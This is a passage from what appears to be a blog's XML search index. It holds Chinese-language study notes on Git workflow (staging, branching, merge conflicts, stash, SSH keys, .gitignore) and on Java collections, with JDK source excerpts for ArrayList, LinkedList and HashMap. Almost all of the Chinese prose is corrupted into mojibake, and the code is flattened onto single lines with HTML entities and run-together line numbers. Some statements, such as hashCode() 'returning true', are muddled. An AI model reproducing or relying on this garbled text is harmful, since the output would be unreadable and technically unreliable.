çš„çº¿ç¨‹å»å¤„ç†åŒä¸€ä¸ªèµ„æº 2ï¼‰ï¼šå¯ä»¥é¿å… java ä¸­çš„å•ç»§æ‰¿çš„é™åˆ¶ 3ï¼‰ï¼šå¢åŠ ç¨‹åºçš„å¥å£®æ€§ï¼Œä»£ç å¯ä»¥è¢«å¤šä¸ªçº¿ç¨‹å…±äº«ï¼Œä»£ç å’Œæ•°æ®ç‹¬ç«‹ 4ï¼‰ï¼šçº¿ç¨‹æ± åªèƒ½æ”¾å…¥å®ç° Runable æˆ– callable ç±»çº¿ç¨‹ï¼Œä¸èƒ½ç›´æ¥æ”¾å…¥ç»§æ‰¿ Thread çš„ç±» â€¦]]></content>
      <categories>
        <category>Java</category>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git]]></title>
    <url>%2F2018%2F05%2F29%2FJava%2FInterview%2FInterview-Notebook%2FGit%2F</url>
    <content type="text"><![CDATA[å­¦ä¹ èµ„æ–™ é›†ä¸­å¼ä¸åˆ†å¸ƒå¼ Git çš„ä¸­å¿ƒæœåŠ¡å™¨ Git å·¥ä½œæµ åˆ†æ”¯å®ç° å†²çª Fast forward åˆ†æ”¯ç®¡ç†ç­–ç•¥ å‚¨è—ï¼ˆStashingï¼‰ SSH ä¼ è¾“è®¾ç½® .gitignore æ–‡ä»¶ Git å‘½ä»¤ä¸€è§ˆ å­¦ä¹ èµ„æ–™ Git - ç®€æ˜æŒ‡å— å›¾è§£ Git å»–é›ªå³° : Git æ•™ç¨‹ Learn Git Branching é›†ä¸­å¼ä¸åˆ†å¸ƒå¼Git å±äºåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œè€Œ SVN å±äºé›†ä¸­å¼ã€‚ é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶åªæœ‰ä¸­å¿ƒæœåŠ¡å™¨æ‹¥æœ‰ä¸€ä»½ä»£ç ï¼Œè€Œåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶æ¯ä¸ªäººçš„ç”µè„‘ä¸Šå°±æœ‰ä¸€ä»½å®Œæ•´çš„ä»£ç ã€‚ é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶æœ‰å®‰å…¨æ€§é—®é¢˜ï¼Œå½“ä¸­å¿ƒæœåŠ¡å™¨æŒ‚äº†æ‰€æœ‰äººéƒ½æ²¡åŠæ³•å·¥ä½œäº†ã€‚ é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶éœ€è¦è¿ç½‘æ‰èƒ½å·¥ä½œï¼Œå¦‚æœç½‘é€Ÿè¿‡æ…¢ï¼Œé‚£ä¹ˆæäº¤ä¸€ä¸ªæ–‡ä»¶çš„ä¼šæ…¢çš„æ— æ³•è®©äººå¿å—ã€‚è€Œåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ä¸éœ€è¦è¿ç½‘å°±èƒ½å·¥ä½œã€‚ åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶æ–°å»ºåˆ†æ”¯ã€åˆå¹¶åˆ†æ”¯æ“ä½œé€Ÿåº¦éå¸¸å¿«ï¼Œè€Œé›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶æ–°å»ºä¸€ä¸ªåˆ†æ”¯ç›¸å½“äºå¤åˆ¶ä¸€ä»½å®Œæ•´ä»£ç ã€‚ Git çš„ä¸­å¿ƒæœåŠ¡å™¨Git çš„ä¸­å¿ƒæœåŠ¡å™¨ç”¨æ¥äº¤æ¢æ¯ä¸ªç”¨æˆ·çš„ä¿®æ”¹ã€‚æ²¡æœ‰ä¸­å¿ƒæœåŠ¡å™¨ä¹Ÿèƒ½å·¥ä½œï¼Œä½†æ˜¯ä¸­å¿ƒæœåŠ¡å™¨èƒ½å¤Ÿ 24 å°æ—¶ä¿æŒå¼€æœºçŠ¶æ€ï¼Œè¿™æ ·å°±èƒ½æ›´æ–¹ä¾¿çš„äº¤æ¢ä¿®æ”¹ã€‚Github å°±æ˜¯ä¸€ç§ Git ä¸­å¿ƒæœåŠ¡å™¨ã€‚ Git å·¥ä½œæµ æ–°å»ºä¸€ä¸ªä»“åº“ä¹‹åï¼Œå½“å‰ç›®å½•å°±æˆä¸ºäº†å·¥ä½œåŒºï¼Œå·¥ä½œåŒºä¸‹æœ‰ä¸€ä¸ªéšè—ç›®å½• .gitï¼Œå®ƒå±äº Git çš„ç‰ˆæœ¬åº“ã€‚ Git ç‰ˆæœ¬åº“æœ‰ä¸€ä¸ªç§°ä¸º stage çš„æš‚å­˜åŒºï¼Œè¿˜æœ‰è‡ªåŠ¨åˆ›å»ºçš„ master åˆ†æ”¯ä»¥åŠæŒ‡å‘åˆ†æ”¯çš„ HEAD æŒ‡é’ˆã€‚ git add files æŠŠæ–‡ä»¶çš„ä¿®æ”¹æ·»åŠ åˆ°æš‚å­˜åŒº git commit æŠŠæš‚å­˜åŒºçš„ä¿®æ”¹æäº¤åˆ°å½“å‰åˆ†æ”¯ï¼Œæäº¤ä¹‹åæš‚å­˜åŒºå°±è¢«æ¸…ç©ºäº† git reset â€“ files ä½¿ç”¨å½“å‰åˆ†æ”¯ä¸Šçš„ä¿®æ”¹è¦†ç›–æš‚ç¼“åŒºï¼Œç”¨æ¥æ’¤é”€æœ€åä¸€æ¬¡ git add files git checkout â€“ files ä½¿ç”¨æš‚å­˜åŒºçš„ä¿®æ”¹è¦†ç›–å·¥ä½œç›®å½•ï¼Œç”¨æ¥æ’¤é”€æœ¬åœ°ä¿®æ”¹ å¯ä»¥è·³è¿‡æš‚å­˜åŒºåŸŸç›´æ¥ä»åˆ†æ”¯ä¸­å–å‡ºä¿®æ”¹æˆ–è€…ç›´æ¥æäº¤ä¿®æ”¹åˆ°åˆ†æ”¯ä¸­ git commit -a ç›´æ¥æŠŠæ‰€æœ‰æ–‡ä»¶çš„ä¿®æ”¹æ·»åŠ åˆ°æš‚ç¼“åŒºç„¶åæ‰§è¡Œæäº¤ git checkout HEAD â€“ files å–å‡ºæœ€åä¸€æ¬¡ä¿®æ”¹ï¼Œå¯ä»¥ç”¨æ¥è¿›è¡Œå›æ»šæ“ä½œ åˆ†æ”¯å®ç°Git æŠŠæ¯æ¬¡æäº¤éƒ½è¿æˆä¸€æ¡æ—¶é—´çº¿ã€‚åˆ†æ”¯ä½¿ç”¨æŒ‡é’ˆæ¥å®ç°ï¼Œä¾‹å¦‚ master åˆ†æ”¯æŒ‡é’ˆæŒ‡å‘æ—¶é—´çº¿çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯æœ€åä¸€æ¬¡æäº¤ã€‚HEAD æŒ‡é’ˆæŒ‡å‘çš„æ˜¯å½“å‰åˆ†æ”¯ã€‚ æ–°å»ºåˆ†æ”¯æ˜¯æ–°å»ºä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘æ—¶é—´çº¿çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶è®© HEAD æŒ‡é’ˆæŒ‡å‘æ–°åˆ†æ”¯è¡¨ç¤ºæ–°åˆ†æ”¯æˆä¸ºå½“å‰åˆ†æ”¯ã€‚ æ¯æ¬¡æäº¤åªä¼šè®©å½“å‰åˆ†æ”¯å‘å‰ç§»åŠ¨ï¼Œè€Œå…¶å®ƒåˆ†æ”¯ä¸ä¼šç§»åŠ¨ã€‚ åˆå¹¶åˆ†æ”¯ä¹Ÿåªéœ€è¦æ”¹å˜æŒ‡é’ˆå³å¯ã€‚ å†²çªå½“ä¸¤ä¸ªåˆ†æ”¯éƒ½å¯¹åŒä¸€ä¸ªæ–‡ä»¶çš„åŒä¸€è¡Œè¿›è¡Œäº†ä¿®æ”¹ï¼Œåœ¨åˆ†æ”¯åˆå¹¶æ—¶å°±ä¼šäº§ç”Ÿå†²çªã€‚ Git ä¼šä½¿ç”¨ &lt;&lt;&lt;&lt;&lt;&lt;&lt; ï¼Œ======= ï¼Œ&gt;&gt;&gt;&gt;&gt;&gt;&gt; æ ‡è®°å‡ºä¸åŒåˆ†æ”¯çš„å†…å®¹ï¼Œåªéœ€è¦æŠŠä¸åŒåˆ†æ”¯ä¸­å†²çªéƒ¨åˆ†ä¿®æ”¹æˆä¸€æ ·å°±èƒ½è§£å†³å†²çªã€‚ 12345&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADCreating a new branch is quick &amp; simple.=======Creating a new branch is quick AND simple.&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1 Fast forwardâ€œå¿«è¿›å¼åˆå¹¶â€ï¼ˆfast-farward mergeï¼‰ï¼Œä¼šç›´æ¥å°† master åˆ†æ”¯æŒ‡å‘åˆå¹¶çš„åˆ†æ”¯ï¼Œè¿™ç§æ¨¡å¼ä¸‹è¿›è¡Œåˆ†æ”¯åˆå¹¶ä¼šä¸¢å¤±åˆ†æ”¯ä¿¡æ¯ï¼Œä¹Ÿå°±ä¸èƒ½åœ¨åˆ†æ”¯å†å²ä¸Šçœ‹å‡ºåˆ†æ”¯ä¿¡æ¯ã€‚ å¯ä»¥åœ¨åˆå¹¶æ—¶åŠ ä¸Š â€“no-ff å‚æ•°æ¥ç¦ç”¨ Fast forward æ¨¡å¼ï¼Œå¹¶ä¸”åŠ ä¸Š -m å‚æ•°è®©åˆå¹¶æ—¶äº§ç”Ÿä¸€ä¸ªæ–°çš„ commitã€‚ 1$ git merge --no-ff -m &quot;merge with no-ff&quot; dev åˆ†æ”¯ç®¡ç†ç­–ç•¥master åˆ†æ”¯åº”è¯¥æ˜¯éå¸¸ç¨³å®šçš„ï¼Œåªç”¨æ¥å‘å¸ƒæ–°ç‰ˆæœ¬ï¼› æ—¥å¸¸å¼€å‘åœ¨å¼€å‘åˆ†æ”¯ dev ä¸Šè¿›è¡Œã€‚ å‚¨è—ï¼ˆStashingï¼‰åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸Šæ“ä½œä¹‹åï¼Œå¦‚æœè¿˜æ²¡æœ‰å°†ä¿®æ”¹æäº¤åˆ°åˆ†æ”¯ä¸Šï¼Œæ­¤æ—¶è¿›è¡Œåˆ‡æ¢åˆ†æ”¯ï¼Œé‚£ä¹ˆå¦ä¸€ä¸ªåˆ†æ”¯ä¸Šä¹Ÿèƒ½çœ‹åˆ°æ–°çš„ä¿®æ”¹ã€‚è¿™æ˜¯å› ä¸ºæ‰€æœ‰åˆ†æ”¯éƒ½å…±ç”¨ä¸€ä¸ªå·¥ä½œåŒºçš„ç¼˜æ•…ã€‚ å¯ä»¥ä½¿ç”¨ git stash å°†å½“å‰åˆ†æ”¯çš„ä¿®æ”¹å‚¨è—èµ·æ¥ï¼Œæ­¤æ—¶å½“å‰å·¥ä½œåŒºçš„æ‰€æœ‰ä¿®æ”¹éƒ½ä¼šè¢«å­˜åˆ°æ ˆä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´å½“å‰å·¥ä½œåŒºæ˜¯å¹²å‡€çš„ï¼Œæ²¡æœ‰ä»»ä½•æœªæäº¤çš„ä¿®æ”¹ã€‚æ­¤æ—¶å°±å¯ä»¥å®‰å…¨çš„åˆ‡æ¢åˆ°å…¶å®ƒåˆ†æ”¯ä¸Šäº†ã€‚ 123$ git stashSaved working directory and index state \ &quot;WIP on master: 049d078 added the index file&quot;HEAD is now at 049d078 added the index file (To restore them type &quot;git stash apply&quot;) è¯¥åŠŸèƒ½å¯ä»¥ç”¨äº bug åˆ†æ”¯çš„å®ç°ã€‚å¦‚æœå½“å‰æ­£åœ¨ dev åˆ†æ”¯ä¸Šè¿›è¡Œå¼€å‘ï¼Œä½†æ˜¯æ­¤æ—¶ master ä¸Šæœ‰ä¸ª bug éœ€è¦ä¿®å¤ï¼Œä½†æ˜¯ dev åˆ†æ”¯ä¸Šçš„å¼€å‘è¿˜æœªå®Œæˆï¼Œä¸æƒ³ç«‹å³æäº¤ã€‚åœ¨æ–°å»º bug åˆ†æ”¯å¹¶åˆ‡æ¢åˆ° bug åˆ†æ”¯ä¹‹å‰å°±éœ€è¦ä½¿ç”¨ git stash å°† dev åˆ†æ”¯çš„æœªæäº¤ä¿®æ”¹å‚¨è—èµ·æ¥ã€‚ SSH ä¼ è¾“è®¾ç½®Git ä»“åº“å’Œ Github ä¸­å¿ƒä»“åº“ä¹‹é—´çš„ä¼ è¾“æ˜¯é€šè¿‡ SSH åŠ å¯†ã€‚ å¦‚æœå·¥ä½œåŒºä¸‹æ²¡æœ‰ .ssh ç›®å½•ï¼Œæˆ–è€…è¯¥ç›®å½•ä¸‹æ²¡æœ‰ id_rsa å’Œ id_rsa.pub è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»º SSH Keyï¼š 1$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot; ç„¶åæŠŠå…¬é’¥ id_rsa.pub çš„å†…å®¹å¤åˆ¶åˆ° Github â€œAccount settingsâ€ çš„ SSH Keys ä¸­ã€‚ .gitignore æ–‡ä»¶å¿½ç•¥ä»¥ä¸‹æ–‡ä»¶ï¼š æ“ä½œç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶ï¼Œæ¯”å¦‚ç¼©ç•¥å›¾ï¼› ç¼–è¯‘ç”Ÿæˆçš„ä¸­é—´æ–‡ä»¶ï¼Œæ¯”å¦‚ Java ç¼–è¯‘äº§ç”Ÿçš„ .class æ–‡ä»¶ï¼› è‡ªå·±çš„æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚å­˜æ”¾å£ä»¤çš„é…ç½®æ–‡ä»¶ã€‚ ä¸éœ€è¦å…¨éƒ¨è‡ªå·±ç¼–å†™ï¼Œå¯ä»¥åˆ° https://github.com/github/gitignore ä¸­è¿›è¡ŒæŸ¥è¯¢ã€‚ Git å‘½ä»¤ä¸€è§ˆ æ¯”è¾ƒè¯¦ç»†çš„åœ°å€ï¼šhttp://www.cheat-sheets.org/saved-copy/git-cheat-sheet.pdf]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaåŸºç¡€å¢å¼º-1 é›†åˆåå°„è®¾è®¡æ¨¡å¼æ’åº]]></title>
    <url>%2F2018%2F05%2F29%2FJava%2FMyStudy%2FJava%E5%9F%BA%E7%A1%80%E5%A2%9E%E5%BC%BA-1%2F</url>
    <content type="text"><![CDATA[1ã€é›†åˆæ¡†æ¶1.1 ã€é›†åˆæ¡†æ¶ä½“ç³»å›¾ Java çš„é›†åˆæ¡†æ¶ä¸»è¦åˆ†ä¸ºäº”å¤§ç±»ä½“ç³»ï¼š1ã€Collectionï¼ˆå¸¸ç”¨çš„ List å’Œ Setï¼Œå’Œä¸å¸¸ç”¨çš„ Queue å’Œ Vector å’Œ Stackï¼‰ï¼Œå•å…ƒç´ é›†åˆ2ã€Mapï¼ˆå¸¸ç”¨çš„ HashMap å’Œ TreeMapï¼Œä¸å¸¸ç”¨çš„ HashTableï¼‰ï¼ŒKey-Value æ˜ å°„3ã€Iteratorï¼ˆè¿­ä»£å™¨ï¼‰4ã€å·¥å…·ç±»ï¼ˆCollections å’Œ Arraysï¼‰5ã€Comparable å’Œ Comparator æ¯”è¾ƒå™¨ Java ä¸­çš„é›†åˆå’Œæ•°ç»„çš„åŒºåˆ«:1ã€æ•°ç»„é•¿åº¦åœ¨åˆå§‹åŒ–æ—¶æŒ‡å®šï¼Œæ„å‘³ç€åªèƒ½ä¿å­˜å®šé•¿çš„æ•°æ®ã€‚è€Œé›†åˆå¯ä»¥ä¿å­˜æ•°é‡ä¸ç¡®å®šçš„ æ•°æ®ã€‚åŒæ—¶å¯ä»¥ä¿å­˜å…·æœ‰æ˜ å°„å…³ç³»çš„æ•°æ®ï¼ˆå³å…³è”æ•°ç»„ï¼Œé”®å€¼å¯¹ key-valueï¼‰ã€‚ 2ã€æ•°ç»„å…ƒç´ å³å¯ä»¥æ˜¯åŸºæœ¬ç±»å‹çš„å€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡ã€‚é›†åˆé‡Œåªèƒ½ä¿å­˜å¯¹è±¡ï¼ˆå®é™…ä¸Šåªæ˜¯ä¿å­˜å¯¹è±¡çš„å¼•ç”¨å˜é‡ï¼‰ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹çš„å˜é‡è¦è½¬æ¢æˆå¯¹åº”çš„åŒ…è£…ç±»æ‰èƒ½æ”¾å…¥é›†åˆç±»ä¸­ã€‚ Collection æ¥å£ä¸­çš„æ–¹æ³•ï¼š Map æ¥å£ä¸­çš„æ–¹æ³•ï¼š 1.2ã€å¸¸ç”¨é›†åˆç‰¹æ€§æ¦‚è¿°1.2.1 List ç³» List ç‰¹ç‚¹ï¼šå…ƒç´ æœ‰æ”¾å…¥é¡ºåºï¼Œå…ƒç´ å¯é‡å¤ List æ¥å£æœ‰ä¸‰ä¸ªå®ç°ç±»ï¼šLinkedListï¼ŒArrayListï¼ŒVector LinkedListï¼šåº•å±‚åŸºäºé“¾è¡¨å®ç°ï¼Œé“¾è¡¨å†…å­˜æ˜¯æ•£ä¹±çš„ï¼Œæ¯ä¸€ä¸ªå…ƒç´ å­˜å‚¨æœ¬èº«å†…å­˜åœ°å€çš„åŒæ—¶è¿˜ å­˜å‚¨ä¸‹ä¸€ä¸ªå…ƒç´ çš„åœ°å€ã€‚é“¾è¡¨å¢åˆ å¿«ï¼ŒæŸ¥æ‰¾æ…¢ ArrayList å’Œ Vector åº•å±‚éƒ½æ˜¯åŸºäºæ•°ç»„å®ç°çš„ï¼ŒæŸ¥è¯¢å¿«ï¼Œå¢åˆ æ…¢ï¼ŒåŒºåˆ«æ˜¯ ArrayList æ˜¯éçº¿ç¨‹å®‰å…¨çš„ï¼Œæ•ˆç‡é«˜ï¼›Vector æ˜¯åŸºäºçº¿ç¨‹å®‰å…¨çš„ï¼Œæ•ˆç‡ä½ ArrayList çš„åˆå§‹åŒ–å¤§å°æ˜¯ 10ï¼Œæ‰©å®¹ç­–ç•¥æ˜¯ 1.5 å€åŸå…ƒç´ æ•°é‡çš„å¤§å° æ•°ç»„ åˆå§‹å®¹é‡+æ‰©å®¹ (jdk10)12345678910111213141516171819// åˆå§‹å®¹é‡private static final int DEFAULT_CAPACITY = 10;// æ‰©å®¹private int newCapacity(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt;= 0) &#123; if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) return Math.max(DEFAULT_CAPACITY, minCapacity); if (minCapacity &lt; 0) // overflow throw new OutOfMemoryError(); return minCapacity; &#125; return (newCapacity - MAX_ARRAY_SIZE &lt;= 0) ? newCapacity : hugeCapacity(minCapacity); &#125; é€‰æ‹©æ ‡å‡†ï¼š å¦‚æœæ¶‰åŠåˆ°â€œåŠ¨æ€æ•°ç»„â€ã€â€œæ ˆâ€ã€â€œé˜Ÿåˆ—â€ã€â€œé“¾è¡¨â€ç­‰ç»“æ„ï¼Œåº”è¯¥è€ƒè™‘ç”¨ Listï¼Œå…·ä½“çš„é€‰æ‹©å“ª ä¸ª Listï¼Œæ ¹æ®ä¸‹é¢çš„æ ‡å‡†æ¥å–èˆã€‚ 1ã€å¯¹äºéœ€è¦å¿«é€Ÿæ’å…¥ï¼Œåˆ é™¤å…ƒç´ ï¼Œåº”è¯¥ä½¿ç”¨ LinkedListã€‚ï¼ˆå¢åˆ æ”¹ï¼‰ 2ã€å¯¹äºéœ€è¦å¿«é€Ÿéšæœºè®¿é—®å…ƒç´ ï¼Œåº”è¯¥ä½¿ç”¨ ArrayListã€‚ï¼ˆæŸ¥è¯¢ï¼‰ 3ã€å¯¹äºâ€œå•çº¿ç¨‹ç¯å¢ƒâ€æˆ–è€…â€œå¤šçº¿ç¨‹ç¯å¢ƒï¼Œä½† List ä»…ä»…åªä¼šè¢«å•ä¸ªçº¿ç¨‹æ“ä½œâ€ï¼Œæ­¤æ—¶åº”è¯¥ä½¿ ç”¨éåŒæ­¥çš„ç±»(å¦‚ ArrayList)ã€‚å¯¹äºâ€œå¤šçº¿ç¨‹ç¯å¢ƒï¼Œä¸” List å¯èƒ½åŒæ—¶è¢«å¤šä¸ªçº¿ç¨‹æ“ä½œâ€ï¼Œæ­¤æ—¶ï¼Œ åº”è¯¥ä½¿ç”¨åŒæ­¥çš„ç±»(å¦‚ Vector)ã€‚ LinkedList add(E e)1234567891011121314151617# add(E e) æºç public boolean add(E e) &#123; linkLast(e); return true;&#125; void linkLast(E e) &#123; final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++;&#125; 1.2.2ã€Set ç³» Set ç‰¹ç‚¹ï¼šå…ƒç´ æ”¾å…¥æ— é¡ºåºï¼Œå…ƒç´ ä¸å¯é‡å¤ Set æ¥å£çš„å®ç°ç±»ï¼šHashSetï¼ŒTreeSetï¼ŒLinkedHashSet HashSetï¼ˆåº•å±‚ç”± HashMap å®ç°ï¼‰åº•å±‚é€šè¿‡ hashCode()å’Œ equals()è¿›è¡Œå»é‡ã€‚ HashSet å†…éƒ¨åˆ¤æ–­ç›¸ç­‰çš„æ ‡å‡†HashSet åˆ¤æ–­ä¸¤ä¸ªå…ƒç´ ç›¸ç­‰çš„æ ‡å‡†ï¼š â€‹ ä¸¤ä¸ªå¯¹è±¡é€šè¿‡ equals()æ–¹æ³•æ¯”è¾ƒç›¸ç­‰ï¼Œå¹¶ä¸”ä¸¤ä¸ªå¯¹è±¡çš„ hashCode()æ–¹æ³•è¿”å›å€¼ä¹Ÿç›¸ç­‰ HashSet ä¸­åˆ¤æ–­é›†åˆå…ƒç´ ç›¸ç­‰ï¼Œä¸¤ä¸ªå¯¹è±¡æ¯”è¾ƒå…·ä½“åˆ†ä¸ºå¦‚ä¸‹å››ä¸ªæƒ…å†µï¼š å¦‚æœæœ‰ä¸¤ä¸ªå…ƒç´ é€šè¿‡ equal()æ–¹æ³•æ¯”è¾ƒè¿”å› falseï¼Œå¹¶ä¸”å®ƒä»¬çš„ hashCode()æ–¹æ³•è¿”å›ä¸ç›¸ç­‰ï¼Œ HashSet å°†ä¼šæŠŠå®ƒä»¬å­˜å‚¨åœ¨ä¸åŒçš„ä½ç½®ã€‚ å¦‚æœæœ‰ä¸¤ä¸ªå…ƒç´ é€šè¿‡ equal()æ–¹æ³•æ¯”è¾ƒè¿”å› trueï¼Œå¹¶ä¸”å®ƒä»¬çš„ hashCode()æ–¹æ³•è¿”å›ä¸ç›¸ç­‰ï¼Œ HashSet å°†ä¼šæŠŠå®ƒä»¬å­˜å‚¨åœ¨ä¸åŒçš„ä½ç½®ã€‚ å¦‚æœä¸¤ä¸ªå¯¹è±¡é€šè¿‡ equals()æ–¹æ³•æ¯”è¾ƒä¸ç›¸ç­‰ï¼ŒhashCode()æ–¹æ³•æ¯”è¾ƒç›¸ç­‰ï¼ŒHashSet å°†ä¼šæŠŠå®ƒä»¬å­˜å‚¨åœ¨ç›¸åŒçš„ä½ç½®ï¼Œåœ¨è¿™ä¸ªä½ç½®ä»¥é“¾è¡¨å¼ç»“æ„æ¥ä¿å­˜å¤šä¸ªå¯¹è±¡ã€‚è¿™æ˜¯å› ä¸ºå½“å‘ HashSet é›†åˆä¸­å­˜å…¥ä¸€ä¸ªå…ƒç´ æ—¶ï¼ŒHashSet ä¼šè°ƒç”¨å¯¹è±¡çš„ hashCode()æ–¹æ³•æ¥å¾—åˆ°å¯¹è±¡çš„ hashCode å€¼ï¼Œ ç„¶åæ ¹æ®è¯¥ hashCode å€¼æ¥å†³å®šè¯¥å¯¹è±¡å­˜å‚¨åœ¨ HashSet ä¸­å­˜å‚¨ä½ç½®ã€‚ å¦‚æœæœ‰ä¸¤ä¸ªå…ƒç´ é€šè¿‡ equal()æ–¹æ³•æ¯”è¾ƒè¿”å› trueï¼Œå¹¶ä¸”å®ƒä»¬çš„ hashCode()æ–¹æ³•è¿”å› trueï¼ŒHashSet å°†ä¸äºˆæ·»åŠ ã€‚ LinkedHashSetï¼Œæ˜¯ HashSet çš„å­ç±»ï¼Œåœ¨æ’å…¥å…ƒç´ çš„æ—¶å€™ï¼ŒåŒæ—¶ä½¿ç”¨é“¾è¡¨ç»´æŒæ’å…¥å…ƒç´ çš„é¡ºåº SortedSet æ¥å£æœ‰ä¸€ä¸ªå®ç°ç±»ï¼šTreeSetï¼ˆåº•å±‚ç”±å¹³è¡¡äºŒå‰æ ‘å®ç°ï¼‰ç¡®ä¿é›†åˆä¸­çš„å…ƒç´ éƒ½æ˜¯å‡ºäºæ’åºçŠ¶æ€ æ³¨æ„ LinkedHashSet å’Œ SortedSet åŒºåˆ«ï¼Œå‰è€…å­˜æ’å…¥é¡ºåºï¼Œåè€…å­˜æ’å…¥ä¹‹åçš„é¡ºåº å¦å¤–: JDK5 : æ¡¶è¡¨ + é“¾è¡¨ JDK8 : æ¡¶è¡¨ + é“¾è¡¨ + äºŒå‰æ ‘ - **äºŒå‰æ ‘**: æ£€ç´¢æ·±åº¦ &gt; 8 çš„æ—¶å€™, è½¬åŒ–ä¸ºäºŒå‰æ ‘, å‡å°‘æŸ¥è¯¢æ·±åº¦ HashSet â€” HashMap çš„æºç å®ç°123456789101112131415161718192021222324252627282930313233343536373839/** * The default initial capacity - MUST be a power of two. * æ¡¶è¡¨é»˜è®¤å®¹é‡ 16 * æ§åˆ¶hashcode ä¸è¶…16èŒƒå›´, a.hashcode = xx % 16 (hashcode å–æ¨¡ æ¡¶ä¸ªæ•°) */static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16/** * MUST be a power of two &lt;= 1&lt;&lt;30. * æ¡¶è¡¨æœ€å¤§ 2^30 */static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;/** * æ‰©å®¹å› å­: 0.75 * æ‰©å®¹: æ¯æ¬¡2å€ */static final float DEFAULT_LOAD_FACTOR = 0.75f;/** * é“¾è¡¨: hashç®—æ³•å€¼ç›¸åŒçš„æ—¶å€™, ä¼šæŠŠå€¼ç›¸åŒçš„æ”¾åœ¨ä¸€ä¸ªé“¾è¡¨ä¸Š, é“¾è¡¨ä¸Šçš„å…ƒç´ ä¸ªæ•° * è¶…è¿‡8ä¸ªæ—¶, è½¬åŒ–ä¸ºäºŒå‰æ ‘, æå‡æŸ¥è¯¢æ•ˆç‡ */static final int TREEIFY_THRESHOLD = 8;/** * The bin count threshold for untreeifying a (split) bin during a * resize operation. Should be less than TREEIFY_THRESHOLD, and at * most 6 to mesh with shrinkage detection under removal. */static final int UNTREEIFY_THRESHOLD = 6;/** * The smallest table capacity for which bins may be treeified. * (Otherwise the table is resized if too many nodes in a bin.) * Should be at least 4 * TREEIFY_THRESHOLD to avoid conflicts * between resizing and treeification thresholds. */static final int MIN_TREEIFY_CAPACITY = 64; TreeSetçš„é»˜è®¤æ’åº TreeSetæ˜¯æœ‰åºçš„ä¸å¯é‡å¤çš„, æœ‰åºæ˜¯æŒ‡å…ƒç´ å€¼çš„å¤§å° æ•°å€¼ç±»å‹: æŒ‰ç…§å¤§å°è¿›è¡Œå‡åºæ’åº å­—ç¬¦ä¸²ç±»å‹: æŒ‰ç…§å­—å…¸é¡ºåºè¿›è¡Œå‡åºæ’åº å­—ç¬¦ä¸²ä»å·¦åˆ°å³, ä¸€ä½ä¸€ä½çš„æ¯”è¾ƒ è‡ªå®šä¹‰TreeSetç±»å‹: å®ç° compareToæ–¹æ³•, è¿”å›ä¸º0çš„æƒ…å†µä¼šé»˜è®¤è¦†ç›– 1.2.2ã€Map ç³»Map ç‰¹ç‚¹ï¼šå­˜å‚¨çš„å…ƒç´ æ˜¯é”®å€¼å¯¹ï¼Œåœ¨ JDK1.8 ç‰ˆæœ¬ä¸­æ˜¯ Nodeï¼Œåœ¨è€ç‰ˆæœ¬ä¸­æ˜¯ Entry Map æ¥ å£ æœ‰ äº” ä¸ª å¸¸ç”¨ å® ç° ç±» ï¼š HashMap ï¼Œ HashTable ï¼Œ LinkeHashMap ï¼Œ TreeMap ï¼Œ ConcurrentHashMap 1. HashMap &amp; Hashtable çš„åŒºåˆ«HashMap 1. éçº¿ç¨‹å®‰å…¨, æ•ˆç‡é«˜ 2. keyä¸å¯ä»¥é‡å¤ 3. keyå¯ä»¥ä¸ºnull, ä½†åªèƒ½æœ‰ä¸€ä¸ªkeyä¸ºnull Hashtable çº¿ç¨‹å®‰å…¨, æ•ˆç‡ä½ keyä¸å¯ä»¥é‡å¤ ä¸å¯ä»¥ä¸ºnull 2. concurrentHash ç®€å•åˆ†ææ˜¯ä» JDK1.5 ä¹‹åæä¾›çš„ä¸€ä¸ª HashTable çš„æ›¿ä»£å®ç°ï¼Œé‡‡ ä¸€ä¸ª map ä¸­çš„å…ƒç´ åˆ†æˆå¾ˆå¤šçš„ segmentï¼Œé€šè¿‡ lock æœºåˆ¶å¯ä»¥å¯¹æ¯ä¸ª segment åŠ è¯»å†™é”ï¼Œä» è€Œæé«˜ map çš„æ•ˆç‡ï¼Œåº•å±‚å®ç°é‡‡ç”¨æ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘çš„å­˜å‚¨ç»“æ„ 